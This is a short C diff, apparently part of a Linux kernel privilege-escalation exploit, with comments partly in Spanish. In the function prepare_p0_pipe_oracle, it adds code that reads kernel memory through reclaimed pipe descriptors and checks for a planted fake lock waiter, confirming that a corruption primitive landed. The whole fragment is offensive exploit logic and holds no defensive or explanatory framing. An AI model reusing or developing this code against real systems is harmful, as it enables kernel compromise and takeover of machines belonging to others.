@@ -946,6 +946,32 @@ int prepare_p0_pipe_oracle(void) {
     return 0;
   }
 
+  /* DZH1: el MCAST escribe en la pagina del kernel page (p0_gate_page_struct),
+     no en las paginas del pipe. Verificamos ahi el waiter falso. */
+  if (p0_gate_page_struct && gate_hits == 0 && changed_pages == 0) {
+    unsigned char gate_page[PAGE_SIZE];
+    if (kernel_read_data(pipe_fds_reclaim[0][0], p0_gate_page_struct,
+                         gate_page, sizeof(gate_page)) ==
+        (ssize_t)sizeof(gate_page)) {
+      uintptr_t waiter = p0_gate_page_struct + SLIDE_BANK_LOCK_OFF +
+                         SLIDE_BANK_WAITER_OFF;
+      uint64_t w0 = 0, w1 = 0;
+      memcpy(&w0, gate_page + (waiter - p0_gate_page_struct), 8);
+      memcpy(&w1, gate_page + (waiter - p0_gate_page_struct) + 8, 8);
+      pr_info("p0 gate page-struct page=%016zx waiter=%016zx "
+              "w0=%016llx w1=%016llx\n",
+              p0_gate_page_struct, waiter,
+              (unsigned long long)w0, (unsigned long long)w1);
+      if (w0 || w1) {
+        pr_info("p0 gate page-struct confirmed\n");
+        return 1;
+      }
+    } else {
+      pr_warning("p0 gate page-struct read failed page=%016zx errno=%d\n",
+                 p0_gate_page_struct, errno);
+    }
+  }
+
   unsigned char marker[PAGE_SIZE];
   memset(marker, 0x5a, sizeof(marker));
   memcpy(marker, "RMG-P0-PIPE", 11);
